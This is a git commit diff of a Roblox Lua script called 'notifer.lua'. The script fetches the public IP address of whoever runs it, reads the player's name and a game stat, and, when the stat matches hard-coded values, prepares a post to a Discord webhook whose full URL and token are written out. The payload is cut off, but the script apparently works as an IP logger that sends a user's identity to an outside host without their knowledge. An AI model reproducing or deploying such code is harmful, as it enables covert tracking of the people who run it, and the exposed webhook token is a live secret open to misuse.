9ce536e5b3e520b251a02cff7f4d1b982394365f
grandkoya <60741391+grandkoyaa@users.noreply.github.com>
2020-12-01 20:17:33 +0300

    Update notifer.lua

--- scriptios/notifer.lua
+++ scriptios/notifer.lua
@@ -1,3 +1,4 @@
+_G.kging = true
 local kg = {"byakugangold", "aduritewood", "namikazegod", "whitelightning"}
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 local time = os.date("%H:".."%M:".."%S ")
@@ -5,11 +6,10 @@ local time1 = os.date("date: %d.".."%m.".."%Y")
 local founder = game.Players.LocalPlayer.statz.main.kg2.Value
 local name = game.Players.LocalPlayer.Name
 
-_G.kging = true
 while _G.kging do
 wait(0.1)
 for i,v in next, kg do
-if game.Players.ForceNATIONS.statz.main.kg2.Value == v then
+if game.Players.LocalPlayer.statz.main.kg2.Value == v then
     _G.kging = false
 local url = "https://discordapp.com/api/webhooks/783329881249284106/gzfK1SaW2jTF7I9YMqKNzlqDnTlxlz_1Rm1b-lLAUu_1ZNe_J9TAEp2FeQ1iL7KLNFFg"
 local data = {
